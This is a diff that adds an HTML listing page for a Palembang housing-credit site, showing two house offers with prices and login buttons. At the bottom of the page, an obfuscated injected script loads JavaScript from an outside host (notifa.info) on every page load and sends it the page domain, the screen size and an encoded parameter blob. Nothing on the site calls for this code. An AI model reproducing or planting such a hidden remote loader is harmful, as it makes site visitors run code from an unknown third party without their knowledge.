@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Sistem Kredit Perumahan</title>
+        <link rel="shortcut icon" href="http://anggundps.online//assets/foto/favicon_phising.png">
+        <link href="http://anggundps.online/assets/css/landingstyle.css" rel="stylesheet" type="text/css">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/bs4/jq-3.3.1/dt-1.10.20/af-2.3.4/b-1.6.1/b-colvis-1.6.1/b-flash-1.6.1/b-html5-1.6.1/b-print-1.6.1/cr-1.5.2/fc-3.3.0/fh-3.1.6/kt-2.5.1/r-2.2.3/rg-1.1.1/rr-1.2.6/sc-2.0.1/sl-1.3.1/datatables.min.css"/>
+        
+        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+        <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+ 
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.36/pdfmake.min.js"></script>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.36/vfs_fonts.js"></script>
+        <script type="text/javascript" src="https://cdn.datatables.net/v/bs4/jq-3.3.1/dt-1.10.20/af-2.3.4/b-1.6.1/b-colvis-1.6.1/b-flash-1.6.1/b-html5-1.6.1/b-print-1.6.1/cr-1.5.2/fc-3.3.0/fh-3.1.6/kt-2.5.1/r-2.2.3/rg-1.1.1/rr-1.2.6/sc-2.0.1/sl-1.3.1/datatables.min.js"></script>    
+        <script src="https://unpkg.com/jspdf@latest/dist/jspdf.min.js"></script>
+        <script src="https://unpkg.com/jspdf-autotable@3.2.11/dist/jspdf.plugin.autotable.js"></script>
+    </head>
+  <style>
+    .loader {
+      border: 2px solid #f3f3f3; /* Light grey */
+      border-top: 2px solid #3498db; /* Blue */
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+
+    @media(max-width:33.9em) {
+    .navbar .collapse {max-height:250px;width:100%;overflow-y:auto;overflow-x:hidden;}
+    .navbar .navbar-brand {float:none;display: inline-block;}
+    .navbar .navbar-nav>.nav-item { float: none; margin-left: .1rem;}
+    .navbar .navbar-nav {float:none !important;}
+    .nav-item{width:100%;text-align:left;}
+    .navbar .collapse .dropdown-menu {
+      position: relative;
+      float: none;
+      background:none;
+      border:none;
+    }
+  }
+  
+  .ph_section_one{
+    overflow-y : hidden;
+    padding-top: 2em;
+    min-height: 800px ;
+    padding-bottom: 2em;
+  }
+
+
+  .section_one{
+    padding-top: 6em;
+    padding-bottom: 6em;
+  }
+  
+  .section_two{
+    padding-top: 2.5em;
+    background-color: #f5f5f5;
+    padding-bottom: 0em;
+  }
+  
+  .section_three{
+    padding-top: 1.5em;
+    background-color: #f5f5f5;
+    padding-bottom: 1.5em;
+  }
+  
+  .section_four{
+    padding-top: 2.5em;
+    background-color: #f5f5f5;
+    padding-bottom: 2.5em;
+  }
+  
+  .section_five{
+    padding-top: 3.5em;
+    background-color: #fff;
+    padding-bottom: 2.5em;
+  }
+  
+  .section_subheader{
+    padding-top: 4.5em;
+    background-color: #eee;
+    padding-bottom: 3.5em;
+  }
+  
+  .height_card{
+    height: 60px;
+  }
+  
+  .card_containers:hover{
+    background: #fcfcfc;
+  }
+  
+  .analyzeme{
+    cursor: pointer;
+    width:100%;
+    background:rgb(0, 168, 104);
+    color:#fff;
+    font-weight:bold;
+    padding:30px;
+    font-size:20px;
+    border : 3px solid rgb(0, 168, 104);
+    position:relative;
+    left:-1px;
+    border-radius: 4px;
+  }
+
+  * {
+    -webkit-backface-vibisility: hidden;
+       -moz-backface-vibisility: hidden;
+        -ms-backface-vibisility: hidden;
+  }
+  
+  .breadcrumbs {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+  }
+  
+  .breadcrumbs li {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+    display: block;
+    float: left;
+    font-family: Helvetica Neue,sans-serif;
+    font-size: 13px;
+    text-transform: uppercase;
+    font-weight: 700;
+    letter-spacing: .05em;
+    line-height: 20px;
+    color: hsl(0, 0%, 30%);
+  }
+  
+  .breadcrumbs li a {
+    display: block;
+    padding: 0 40px 0 0px;
+    color: hsl(0, 0%, 30%);
+    text-decoration: none;
+    height: 20px;
+    position: relative;
+    perspective: 700px;
+  }
+  
+  .breadcrumbs li a:after {
+    content: '';
+    top : 6px;
+    width: 8px;
+    height: 8px;
+    border-color: #333;
+    border-style: solid;
+    border-width: 1px 1px 0 0;
+    outline: 1px solid transparent;
+    position: absolute;
+    right: 20px;
+    -webkit-transition: all .15s ease;
+       -moz-transition: all .15s ease;
+        -ms-transition: all .15s ease;
+            transition: all .15s ease;
+    -webkit-transform: rotateZ(45deg) skew(10deg, 10deg);
+       -moz-transform: rotateZ(45deg) skew(10deg, 10deg);
+        -ms-transform: rotateZ(45deg) skew(10deg, 10deg);
+            transform: rotateZ(45deg) skew(10deg, 10deg);
+  }
+  
+  
+  .breadcrumbs li a:hover:after {
+    right: 15px;
+    -webkit-transform: rotateZ(45deg) skew(-10deg, -10deg);
+       -moz-transform: rotateZ(45deg) skew(-10deg, -10deg);
+        -ms-transform: rotateZ(45deg) skew(-10deg, -10deg);
+            transform: rotateZ(45deg) skew(-10deg, -10deg);
+  }
+
+  #jumboback{
+    border-radius:0px !important;
+  }
+  </style>
+  <body><nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+  <a class="navbar-brand" href="#"><img src="http://anggundps.online/assets/nazifalogo_navbar.svg"/></a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo02" aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
+    <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
+        <li class="nav-item
+            active        ">
+          <a class="nav-link" href="http://anggundps.online/main">Beranda <span class="sr-only">(current)</span></a>
+        </li>
+            </ul>
+      <!-- <input class="form-control mr-sm-2" type="search" placeholder="Search"> -->
+                <a href="http://anggundps.online/login"><button class="btn btn-outline-light my-2 my-sm-0" type="submit">Masuk</button></a>
+          </div>
+</nav>
+<style>
+  .navbar-nav  > li {
+    padding-right:15px;
+    padding-left:15px;
+  }
+</style><section class="jumbotron" style="padding-top:110px;padding-bottom:110px;"  id="jumboback">
+    <div class="container">
+      <h1 class="jumbotron-heading" style="color:#fff;">Nazifa Residence - Kota Palembang</h1>
+      <p class="lead" style="color:#fff;">Hunian dengan harga terjangkau, akad jelas dan tidak ada akad riba.</p>
+    </div>
+</section>
+<main role="main">
+
+<section>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 col-xs-12 w-50">
+                <ul class="breadcrumbs">
+                    <li><a href="http://anggundps.online/">Beranda</a></li>
+                    <li>Daftar Perumahan</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<div class="album py-5 ">
+  <div class="container">
+    <div class="row">
+                  <div class="col-md-4">
+                <div class="card mb-4 box-shadow">
+                  <img class="card-img-top" src="http://anggundps.online/assets/produk/rumah.png" alt="Card image cap">
+                  <div class="card-body">
+                    <p class="card-text" style="font-weight:bold;font-size:24px;color:#999">Rumah Tipe 36 Asri Blok A.6</p>
+                    <span class="" style="font-weight:bold;font-size:17px;position:relative;top:-16px;">Rp 200.000.000,00</span>
+                    <div class="d-flex justify-content-between align-items-center">
+
+                    <small class="text-muted">Kota Palembang</small>
+                                            <a href="login"><button type="button" class="btn btn-info">Login untuk membeli</button></a>
+                                          </div>
+                  </div>
+                </div>
+              </div>
+                      <div class="col-md-4">
+                <div class="card mb-4 box-shadow">
+                  <img class="card-img-top" src="http://anggundps.online/assets/produk/rumah.png" alt="Card image cap">
+                  <div class="card-body">
+                    <p class="card-text" style="font-weight:bold;font-size:24px;color:#999">Rumah Tipe 36 Asri Blok A.3</p>
+                    <span class="" style="font-weight:bold;font-size:17px;position:relative;top:-16px;">Rp 190.000.000,00</span>
+                    <div class="d-flex justify-content-between align-items-center">
+
+                    <small class="text-muted">Kota Palembang</small>
+                                            <a href="login"><button type="button" class="btn btn-info">Login untuk membeli</button></a>
+                                          </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+  </div>
+</div>
+</main>
+<style>
+  #jumboback{
+    background-image : url("https://i.pinimg.com/originals/e4/76/a7/e476a79d454f89fc0930fde6eca4176b.jpg")
+  }
+</style>
+<script>
+    $(document).ready(function(){   
+            let scanbutton = $('#scanning');
+            scanbutton.on('click', function(){
+                let get_data_input = $('#inputurl').val();
+                let checking_input = get_data_input == "" ? true : false;
+                if(checking_input){
+                    alert('Data kosong');
+                }else{
+                    $('.loader').show();
+                    $('#status').show();
+                    $.ajax({
+                        url: "http://anggundps.online/scan", 
+                        method : 'POST',
+                        data : {
+                            urls : get_data_input
+                        },
+                        success: function(result){
+                            if(result == 'ok'){
+                                setTimeout(function(){
+                                    $('.loader').hide();
+                                    $('#status').hide();
+                                    $('#notif').show();
+                                    location.reload();
+                                }, 3000);
+                            }
+                        },
+                        error : function(result){
+                            console.log('gagal broh');
+                            $('#status').text('Gagal');
+                        }
+                    });
+                }
+            });
+            
+    });
+</script><div class="footer-copyright text-center py-3" style="background:#f7f7f7;border-top:1px solid #eee;">© 2020 Copyright:
+    <a href="">Contribute by Anggun.</a>
+  </div>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXl39aVoT1cQuP5m6mIdTlh%2fwpEnXnRov82RzK3VwmbnHH%2bdegFM05g%2fh1mjNMk9TSPXCJh8PT8J%2bAZ%2fETLnDuoW9CgPe6u%2fTNwPmyIWnRQQVjUeUBSqo%2ffj3AC2j08GTj5v3vt32tqeoaaEYbm3nYdFL1nzYO6HRtj8SXDLLeK3a4Epy66P6%2b7KuS1wBITrEbse%2b6pmbC4j%2fKyy43qUY9SK73mcdsKLXBwKsJFH4kwd4FrNtgqQkQe4aiGvyHofra2cEoXCEqoAdzWXLmTY6la812pO8M56P%2fAkQ4k0DiSRb41X6iJPS%2fPThxDesMxaOxHPLG0fpEe274HY9l8JhIGbrTYjU5qyTMaDHXDDxXX3QLuzMH%2fS180q9g8OKqG3t4DgcxkAxQTbw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+<script>
+  feather.replace();  
+</script>
